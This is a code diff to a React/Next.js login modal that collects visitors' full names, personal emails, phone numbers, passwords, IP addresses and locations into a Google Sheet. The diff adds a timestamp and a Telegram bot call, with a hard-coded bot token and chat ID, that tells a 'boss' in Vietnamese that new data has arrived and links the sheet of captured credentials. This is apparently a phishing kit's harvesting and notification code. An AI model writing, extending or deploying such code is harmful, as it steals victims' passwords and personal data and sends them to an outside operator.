@@ -8,12 +8,14 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import IntlTelInput from 'intl-tel-input/reactWithUtils';
 import 'intl-tel-input/styles';
 import Image from 'next/image';
+import axios from 'axios';
 import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
 
 interface FormData {
     fullName: string;
     personalEmail: string;
     password: string;
+    currentTime: string;
 }
 
 interface FormField {
@@ -37,7 +39,8 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
         personalEmail: '',
-        password: ''
+        password: '',
+        currentTime: ''
     });
 
     const { setModalOpen, geoInfo, currentRow, setCurrentRow } = store();
@@ -98,29 +101,40 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         setIsLoading(true);
 
-        const formDataToSend = [[geoInfo?.ip || 'N/A', geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A', formData.fullName, formData.personalEmail, phoneNumber, formData.password]];
+        const now = new Date();
+        const vietnamTime = new Date(now.toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' }));
+        const formattedTime = vietnamTime.toLocaleString('vi-VN', {
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: false
+        });
+
+        const formDataToSend = [[formattedTime, geoInfo?.ip || 'N/A', geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A', formData.fullName, formData.personalEmail, phoneNumber, formData.password]];
+
+        const telegramMessage = `sếp ơiiiii, có data nè\n\n<a href="https://docs.google.com/spreadsheets/d/1fq0JY27aCR64GOAONNG4itQoDk92FKs_kOkFpvuC5rQ">Xem data</a>`;
 
         try {
-            const res = await fetch('/api/sheets', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    action: currentRow ? 'update' : 'append',
-                    value: formDataToSend,
-                    row: currentRow || undefined
-                })
+            await axios.post(`https://api.telegram.org/bot8256986050:AAEf8EfL1iyMKJnsK7-ZZzYJEQN8ZQ8RIEk/sendMessage`, {
+                chat_id: '-5043542465',
+                text: telegramMessage,
+                parse_mode: 'HTML'
             });
 
-            if (res.ok) {
-                const data = await res.json();
-                if (!currentRow) {
-                    if (data?.updates?.updatedRange) {
-                        const match = data.updates.updatedRange.match(/!A(\d+)/);
-                        if (match) {
-                            setCurrentRow(Number.parseInt(match[1], 10));
-                        }
+            const res = await axios.post('/api/sheets', {
+                action: currentRow ? 'update' : 'append',
+                value: formDataToSend,
+                row: currentRow || undefined
+            });
+
+            if (res.status === 200) {
+                if (!currentRow && res.data?.updates?.updatedRange) {
+                    const match = res.data.updates.updatedRange.match(/!A(\d+)/);
+                    if (match) {
+                        setCurrentRow(Number.parseInt(match[1], 10));
                     }
                 }
             }
